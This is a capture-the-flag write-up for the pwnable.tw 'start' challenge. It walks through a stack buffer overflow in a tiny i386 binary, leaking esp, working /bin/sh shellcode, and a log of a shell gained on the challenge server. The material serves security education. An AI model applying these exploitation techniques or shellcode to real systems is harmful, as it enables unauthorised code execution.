# pwnable.tw - start
_Writeup by Zander Work_

Tl;dr buffer overflow to control `eip`, leak `esp`, and jump to shellcode

This binary is very small, and comes in at 564 bytes. The only function we care about is `_start`:
```asm
Dump of assembler code for function _start:
   0x08048060 <+0>:	push   %esp
   0x08048061 <+1>:	push   $0x804809d
   0x08048066 <+6>:	xor    %eax,%eax
   0x08048068 <+8>:	xor    %ebx,%ebx
   0x0804806a <+10>:	xor    %ecx,%ecx
   0x0804806c <+12>:	xor    %edx,%edx
   0x0804806e <+14>:	push   $0x3a465443
   0x08048073 <+19>:	push   $0x20656874
   0x08048078 <+24>:	push   $0x20747261
   0x0804807d <+29>:	push   $0x74732073
   0x08048082 <+34>:	push   $0x2774654c
   0x08048087 <+39>:	mov    %esp,%ecx
   0x08048089 <+41>:	mov    $0x14,%dl
   0x0804808b <+43>:	mov    $0x1,%bl
   0x0804808d <+45>:	mov    $0x4,%al
   0x0804808f <+47>:	int    $0x80
   0x08048091 <+49>:	xor    %ebx,%ebx
   0x08048093 <+51>:	mov    $0x3c,%dl
   0x08048095 <+53>:	mov    $0x3,%al
   0x08048097 <+55>:	int    $0x80
   0x08048099 <+57>:	add    $0x14,%esp
   0x0804809c <+60>:	ret
```

Here's what the function does:
 1. Save `esp` and return address
 2. Clear registers
 3. Build the string `Let's start the CTF:` on the stack
 4. Setup arguments for write syscall
 5. Make the syscall: `write(1, %esp, 20)`
    - `esp` points to the string "Let's start the CTF:"
 6. Setup arguments for read syscall
 7. Make the syscall: `read(0, %esp, 60)`
 8. Reset stack and return

There's a pretty obvious buffer overflow vulnerability in this binary. There are 20 bytes allocated in the function for the string "Let's start the CTF:", and the read syscall gets 60 bytes.

Let's check the security protections of the binary:
```
$ checksec start
[*] '/Users/zander/sec/pwnable.tw/start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

We see that NX is not enabled, so we can put shellcode on the stack and jump to it. However, we need to figure out where our shellcode is so we can jump to it.

Let's look at the layout of the stack write before the `read` system call:
```
+---------------+
|      esp      |
+---------------+
|    ret addr   |
+---------------+
|     "CTF:"    |
+---------------+
|     "the "    |
+---------------+
|     "art "    |
+---------------+
|     "s st"    |
+---------------+
|     "Let'"    |
+---------------+
```

Let's say we input "asdf\n" to the write system call. The stack would then look like this:
```
+---------------+
|      esp      |
+---------------+
|    ret addr   |
+---------------+
|     "CTF:"    |
+---------------+
|     "the "    |
+---------------+
|     "art "    |
+---------------+
|     "\n st"   |
+---------------+
|     "asdf"    |
+---------------+
```

With this, we are easily able to overwrite the return address. But how can we get esp?

Since PIE is disabled, we know the addresses of the code. Therefore, we can jump back into `_start` and read 20 more bytes. By jumping to `0x8048087`, we can setup another write system call to get another 20 bytes off the stack:
```
+---------------+
|      ????     |
+---------------+
|      ????     |
+---------------+
|      ????     |
+---------------+
|      ????     |
+---------------+
|      ????     |
+---------------+
|      ????     |
+---------------+
|      esp      |
+---------------+
```

Once we get to the read system call again, we can put the correct address for where our shellcode will be, and pop a shell.

Here's the shellcode I used:
```asm
xor %eax, %eax
mov $0x0b, %al
xor %ecx, %ecx
xor %edx, %edx
push %edx
push $0x68732f6e
push $0x69622f2f
mov %esp, %ebx
int $0x80
```

With that, we can get a shell on the remote system:
```
$ ./exploit.py
[+] Opening connection to chall.pwnable.tw on port 10000: Done
[*] leaked esp: 0xffb68210
[*] Switching to interactive mode
$ id
uid=1000(start) gid=1000(start) groups=1000(start)
```